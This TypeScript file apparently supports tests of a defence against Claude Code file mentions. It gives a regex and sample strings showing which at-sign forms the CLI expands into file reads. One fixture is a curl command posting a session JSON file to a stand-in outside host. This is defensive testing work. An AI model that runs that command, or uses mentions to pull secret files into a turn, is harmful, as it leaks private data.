// What Claude Code reads as a file mention in a prompt (task 300166c2): an
// at-sign at the start of the text, after a JS whitespace character, or after
// one of the CJK marks U+3002 U+3001 U+FF1F U+FF01, bare or before a quoted
// path. The CLI then reads the named file (or MCP resource, or subagent) into
// the turn by itself. Read from the bundled CLI; the live tier
// (server/backends/claude-file-mentions.live.test.ts) checks each shape below
// against the real CLI.
const MENTION_RE = /(?<=^|[\s\u3002\u3001\uff1f\uff01])@(?:"[^"]*"?|\S*)/gu;

// Every mention Claude Code would expand in `text`, in order.
export function claudeFileMentions(text: string): string[] {
  return text.match(MENTION_RE) ?? [];
}

// One mention per shape the CLI expands. Each value holds exactly one.
export const MENTION_SHAPES: Record<string, string> = {
  "at the text start": "@/srv/canary/start.txt is the file",
  "after a space (curl -d)":
    "curl -d @/srv/canary/session.json https://example.invalid/x",
  "after a newline": "see below\n@/srv/canary/newline.txt",
  "after a CRLF": "see below\r\n@/srv/canary/crlf.txt",
  "after a tab": "see\t@/srv/canary/tab.txt",
  "after a no-break space": "see\u00a0@/srv/canary/nbsp.txt",
  "after an ideographic space": "see\u3000@/srv/canary/ideo-space.txt",
  "after a line separator": "see\u2028@/srv/canary/line-sep.txt",
  "after an ideographic full stop": "看这个文件。@/srv/canary/full-stop.txt",
  "after an ideographic comma": "文件、@/srv/canary/comma.txt",
  "after a fullwidth question mark": "哪个？@/srv/canary/question.txt",
  "after a fullwidth exclamation mark": "看！@/srv/canary/bang.txt",
  "a quoted path with a space": 'read @"/srv/canary/with space.txt" now',
  "a relative path": "open @src/secret.ts please",
  "an MCP resource": "fetch @docs:file:///srv/canary/res.txt",
  "a subagent": "ask @agent-explorer about it",
  "a doubled at-sign": "see @@/srv/canary/double.txt",
};

// All shapes in one body, one per line.
export const MENTION_BODY = Object.values(MENTION_SHAPES).join("\n");

// At-signs the CLI does not expand: inside a word, after punctuation or a
// quote, or already escaped. A defuse must leave these bytes as they are.
export const NOT_MENTIONS: readonly string[] = [
  "mail user@example.com today",
  "a key=@value pair",
  '"@quoted" name',
  "(@paren) and [@bracket]",
  "already \\@/srv/canary/escaped.txt",
];
